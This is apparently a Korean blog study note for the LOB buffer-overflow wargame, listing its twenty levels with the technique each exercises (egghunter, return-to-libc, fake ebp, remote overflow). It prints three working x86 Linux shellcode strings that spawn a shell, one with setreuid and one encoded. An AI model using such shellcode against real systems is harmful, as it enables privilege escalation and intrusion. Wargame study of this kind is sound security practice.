---
title : BOF 설정 및 레벨 설명, 쉘코드
categories: [Wargame, BOF]
tags: [BOF]
---

## bof 설정 
<hr style="border-top: 1px solid;"><br>

Link 
: <a href="https://ssaemo.tistory.com/2?category=863627" target="_blank">ssaemo.tistory.com/2?category=863627</a>

<br><br>
<hr style="border: 2px solid;">
<br><br>

## 레벨 설명
<hr style="border-top: 1px solid;"><br>

```
[레벨업 패스워드 확인]
/bin/my-pass

[몹 리스트]
LEVEL1 (gate -> gremlin) :  simple bof
LEVEL2 (gremlin -> cobolt) : small buffer
LEVEL3 (cobolt -> goblin) : small buffer + stdin
LEVEL4 (goblin -> orc) : egghunter
LEVEL5 (orc -> wolfman) : egghunter + bufferhunter
LEVEL6 (wolfman -> darkelf) : check length of argv[1] + egghunter + bufferhunter
LEVEL7 (darkelf -> orge) : check argv[0]
LEVEL8 (orge -> troll) : check argc
LEVEL9 (troll -> vampire) : check 0xbfff
LEVEL10 (vampire -> skeleton) : argv hunter
LEVEL11 (skeleton -> golem) : stack destroyer
LEVEL12 (golem -> darkknight) : sfp
LEVEL13 (darkknight -> bugbear) : RTL1
LEVEL14 (bugbear -> giant) : RTL2, only execve
LEVEL15 (giant -> assassin) : no stack, no RTL
LEVEL16 (assassin -> zombie_assassin) : fake ebp
LEVEL17 (zombie_assassin -> succubus) : function calls
LEVEL18 (succubus -> nightmare) : plt
LEVEL19 (nightmare -> xavis) : fgets + destroyers
LEVEL20 (xavis -> death_knight) : remote BOF
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## shellcode
<hr style="border-top: 1px solid;"><br>

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80   -->25byte

\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80    --> 41byte

\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81  --> 48byte
```

<br>

shellcode 만들기
: <a href="https://ind2x.github.io/posts/shellcode/" target="_blank">ind2x.github.io/posts/shellcode/</a>

<br><br>
<hr style="border: 2px solid;">
<br><br>
